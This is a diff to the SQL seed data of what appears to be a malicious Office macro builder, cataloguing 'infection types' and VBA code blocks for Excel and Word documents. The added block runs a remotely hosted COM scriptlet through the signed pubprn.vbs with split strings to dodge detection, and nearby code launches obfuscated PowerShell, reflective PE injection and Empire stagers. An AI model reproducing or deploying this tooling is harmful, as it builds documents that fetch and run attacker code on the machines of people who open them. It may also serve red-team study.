@@ -114,6 +114,7 @@ CREATE TABLE `InfectionType_Dependencies` (
 -- INFECTIONTYPE    7: Run In Memory
 -- INFECTIONTYPE    8: Metadata
 -- INFECTIONTYPE    9: Cell Embed - Obfuscated
+-- INFECTIONTYPE   10: Pubprn.vbs
 
 -- DOCTYPES         1: xls
 -- DOCTYPES         2: doc
@@ -137,6 +138,7 @@ CREATE TABLE `InfectionType_Dependencies` (
 -- CODEBLOCK        16: ReflectivePE            harnass
 -- CODEBLOCK        17: Metadata-XLS            harnass
 -- CODEBLOCK        18: Metadata-DOC            harnass
+-- CODEBLOCK        19: Pubprn.vbs              harnass
 
 -------------------------------------------
 
@@ -147,6 +149,7 @@ INSERT INTO DocTypes (Name) VALUES ('doc');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Shell Command', 'Standard shell command. Uses Wscript.Shell to fire the command exactly as is. Be sure your escapes are correct. <evilgrin>');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('PowerShell Script', 'A standard, non-base64 encoded powershell script to run');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Executable', 'Embeds an EXE into cells & fires');    
+INSERT INTO PayloadTypes (Name, Description) VALUES ('COM Scriptlet', 'A URL to a hosted COM Scriptlet file.'); 
 
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.');                                                                              --1
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed', 'Your "go to" for firing PowerShell scripts. Base64 encodes .ps1 payload then embeds into cells. Macro concatenates then fires directly with powershell. Payload does not touch disk.');                        --2
@@ -157,9 +160,11 @@ INSERT INTO InfectionTypes (Name, Description) VALUES ('Save To Disk', 'Saves ex
 INSERT INTO InfectionTypes (Name, Description) VALUES ('ReflectivePE', 'Saves b64 encoded PE as a text file then uses Invoke-ReflectivePEInjection to fire it');   --7
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Metadata', 'Saves your shell command to the `Subject` field of the metadata. Good for empire stagers!');  --8
 INSERT INTO InfectionTypes (Name, Description) VALUES ('Cell Embed-Obfuscated', 'Obfuscates PowerShell based payload using Invoke-Obfuscation');  --9
+INSERT INTO InfectionTypes (Name, Description) VALUES ('Pubprn.vbs', 'Fires your hosted COM scriptlet through pubprn.vbs (Microsoft signed)');  --10
 --INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('DDE', 'Dynamic Data Exchange attack. Macro-less attack! http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/');                                                                           --7
 --INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Encrypted', 'Embeds encrypted payload into cells. When user Enablez Content, key is retrieved and the payload is decrypted, saved to disk, then fired.');                                                   --8
 
+-- Associate infection types to payloads
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 1);     -- Shell Command & Shell Command 
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 2);     -- Powershell Script & CellEmbed
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 3);     -- Powershell Script & CellEmbedNonBase64
@@ -169,8 +174,11 @@ INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 6); 
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (3, 7);     -- Exe & ReflectivePE
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 8);     -- ShellCommand & Metadata
 INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (2, 9);     -- PowerShell & CellEmbed-Obfuscated
+INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (4, 10);     -- Shell Command & pubprn.vbs
 --INSERT INTO Assoc_Infection_Payload (PayloadType, InfectionType) VALUES (1, 9);     -- ShellCommand & DDE
 
+
+-- Associate infection types to document types
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 1); -- XLS & Shell Command
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 2); -- XLS & CellEmbed
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 3); -- XLS & CellEmbed-Nonb64
@@ -180,8 +188,11 @@ INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 6); -- X
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 7); -- XLS & ReflectivePE
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 8); -- XLS & Metadata
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 9); -- XLS & CellEmbed-Obfuscation
+INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (1, 10); -- XLS & pubprn.vbs
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 1); -- DOC & Shell Command
 INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 8); -- DOC & MetaData
+INSERT INTO Assoc_Infection_DocType (DocType, InfectionType) VALUES (2, 10); -- DOC & pubprn.vbs
+
 
 -- 1
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('GetVal', 'util', '
@@ -378,7 +389,7 @@ End Function
 
 --12
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Crypto', 'util', '
-Public Function crypt(sText As String, sKey As String) As String
+Public Function cript(sText As String, sKey As String) As String
     Dim baS(0 To 255) As Byte
     Dim baK(0 To 255) As Byte
     Dim bytSwap     As Byte
@@ -405,7 +416,7 @@ Public Function crypt(sText As String, sKey As String) As String
         baS(lI) = baS(lJ)
         baS(lJ) = bytSwap
         crc = crc & Chr$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
-        crypt = crypt & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
+        cript = cript & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
     Next
 End Function
 
@@ -452,7 +463,7 @@ Sub |RANDOMNAME|()
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     k = em()
     p = crc(fhd(CStr(x)), CStr(k))
-    p = crypt(GetBusiness(CStr(x)), CStr(k))
+    p = cript(GetBusiness(CStr(x)), CStr(k))
     p = Replace(p, """", "\""")
     Dim c As String
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(110) & _
@@ -520,6 +531,14 @@ End Function
 
 ');
 
+--19
+INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PUBPRN', 'harness', '
+Function |RANDOMNAME|()
+    Shell ("cs" & "crip" & "t C:\Wind" & "ows\Sys" & "tem32\Print" & "ing_Admin_Scri" & "pts\en-US\pub" & "prn.vbs localhost script:|URL|")
+End Function
+
+');
+
 
 
 INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (2, 1);  -- CellEmbed                depends on GetVal
@@ -539,7 +558,7 @@ INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (6, 9
 INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (7, 1);  -- ReflectivePE             depends on GetVal
 INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (7, 2);  -- ReflectivePE             depends on RandomName 
 INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (7, 15); -- ReflectivePE             depends on WriteFile 
-INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (9, 1); -- CellEmbed-Obfuscated      depends on GetVal 
+INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (9, 1);  -- CellEmbed-Obfuscated      depends on GetVal 
 --INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 1);  -- Encrypted                depends on GetVal
 --INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 2);  -- Encrypted                depends on RandomName
 --INSERT INTO InfectionType_Dependencies (InfectionType, CodeBlockID) VALUES (8, 11); -- Encrypted                depends on GetEmail
